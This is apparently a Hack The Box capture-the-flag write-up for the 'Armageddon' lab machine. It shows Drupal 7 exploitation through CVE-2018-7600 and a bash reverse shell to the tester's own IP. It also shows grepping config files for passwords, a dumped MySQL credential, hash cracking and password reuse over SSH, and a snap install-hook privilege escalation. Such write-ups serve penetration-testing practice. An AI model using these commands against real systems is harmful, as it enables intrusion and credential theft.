---
title: "Armageddon - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Armageddon
![](https://kar0nx.github.io/assets/images/writeup/4256f259c8ac66a3eda11206371eaf8b.png)
## Reconnaissance

IP: 10.10.10.233
## NMAP

```
nmap -T4 -p- -A 10.10.10.233
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 05:56 EDT
Nmap scan report for 10.10.10.233
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.51 ms 10.10.14.1
2   29.83 ms 10.10.10.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.99 seconds
```

2 ports open so start with 80

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826115830.png)

From nmap we know some directories and that cms is Drupal 7
Last update 7.56, so I let's use drupalgeddon2 https://github.com/lorddemon/drupalgeddon2

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826120124.png)

## Gaining Access

looks like it is working 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826120344.png)

cant hit rev shell so switch to https://github.com/pimps/CVE-2018-7600.git

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826123035.png)

```
python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826123214.png)

We have reverse shell 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826123240.png)

can't do to much with this user, so let's try to search for passowods in config files 

```
grep -ri "password" /var/www/html
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826124521.png)

using cat we can see username for mysql db 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826124648.png)

Now enumerate mysql with this credentials. I fount table users and password here.

```
mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826124831.png)

We have bruce admin account with hashed password.
hashcat recognize this hash as module 7900 and cracked it

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826125005.png)

We have password reused to ssh 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826125211.png)

## Privilege Escalation

Starting with sudo -l we see that bruce can sudo with snap

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826125323.png)

https://gtfobins.github.io/gtfobins/snap/

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826130336.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826130855.png)

no root shell but command was executed so, let's edit command form gtfobins to read root.txt flag:

```
COMMAND='cat /root/root.txt'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250826132504.png)

and we got it.